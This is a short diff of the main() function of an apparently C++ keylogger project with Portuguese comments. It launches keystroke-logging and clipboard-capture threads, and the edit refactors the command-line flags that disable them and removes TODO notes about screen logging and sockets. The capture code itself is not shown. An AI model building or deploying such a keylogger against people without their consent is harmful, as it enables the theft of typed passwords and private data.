@@ -20,7 +20,7 @@ int main(int argc, const char *args[]) {
         exit(0);
     }
 
-//    Presenter::showHeader();
+    Presenter::showHeader();
 
     Logger *logger = Logger::instance();
     bool useSameLogFile = true;
@@ -75,13 +75,11 @@ int main(int argc, const char *args[]) {
     thread[0] = std::thread(keylogger);
     thread[1] = std::thread(clipboard);
 
-    // TODO - ScreenLogger
-    // TODO - Socket
-    // TODO - UI Mode
-
+    bool disableKeyboard = argumentation->hasArg((char *) "--disableKeylogger");
+    bool disableClipboard = argumentation->hasArg((char *) "--disableClipboard");
 
     // Verifica se o clipboard deve ser ativado
-    if (!argumentation->hasArg((char *) "--disableClipboard")) {
+    if (!disableClipboard) {
 
         // Inicia a execução da thread de forma independente, sem fazer com que o processo main espere.
         thread[1].detach();
@@ -91,7 +89,7 @@ int main(int argc, const char *args[]) {
 
 
     // Verifica se o keylogger deve ser ativado
-    if (!argumentation->hasArg((char *) "--disableKeylogger")) {
+    if (!disableKeyboard) {
 
         // Inicia a execucão do Keylogger e faz o processo main esperar.
         thread[0].join();
